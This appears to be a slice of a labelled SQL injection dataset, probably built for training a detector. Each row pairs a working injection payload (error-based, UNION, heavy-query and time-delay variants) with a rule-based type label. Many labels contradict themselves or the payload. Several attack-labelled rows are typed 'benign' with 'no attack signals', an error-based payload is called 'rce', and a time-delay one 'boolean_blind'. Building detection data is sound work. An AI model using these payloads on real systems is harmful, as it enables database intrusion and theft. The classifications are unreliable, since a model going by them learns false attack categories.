row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2040,"-9057"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
2041,"1' ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'iixp' = 'iixp",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
2042,1 ) ) ) and 6467 = 1864#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2043,"1', ( select ( case when ( 1392 = 1380 ) then 1 else 1392* ( select 1392 from master..sysdatabases ) end ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2044,1'|| ( select 'xhcr' from dual where 9279 = 9279,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2045,-4323' ) ) or 6968 = 1393,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2046,"1'+ ( select gajr where 6653 = 6653 union all select null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
2047,-5350 ) ) or 9323 = 9323#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2048,"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'nsji' = 'nsji",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
2049,"1%"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
2050,"-5132%"" ) ) or 3038 = 3038",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2051,"1' in boolean mode ) and make_set ( 7804 = 3315,3315 ) #",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2052,"1"" and 1668 = 8288",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
